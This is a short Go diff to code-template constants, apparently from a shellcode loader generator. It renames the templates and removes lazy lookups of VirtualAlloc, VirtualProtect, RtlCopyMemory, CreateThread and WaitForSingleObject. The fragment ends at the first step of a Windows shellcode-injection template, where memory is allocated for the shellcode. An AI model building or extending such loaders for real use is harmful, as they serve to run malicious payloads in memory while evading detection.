@@ -1,29 +1,20 @@
 package local
 
-const CreateThreadNativeImports = `
+const CreateThreadImports = `
 	"fmt"
 	"log"
-	"os"
-	"time"
+	
+	
 	"unsafe"
 
-	"github.com/salukikit/go-util/pkg/box"
+	
 
 	// Sub Repositories
 
 	"golang.org/x/sys/windows"
 `
-const CreateThreadNativeDlls = `
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
-	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
-	VirtualProtect := kernel32.NewProc("VirtualProtect")
-	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
-	CreateThread := kernel32.NewProc("CreateThread")
-	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
-`
-const CreateThreadNative = `
+const CreateThread = `
 	addr, errVirtualAlloc := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
 	if errVirtualAlloc != nil {
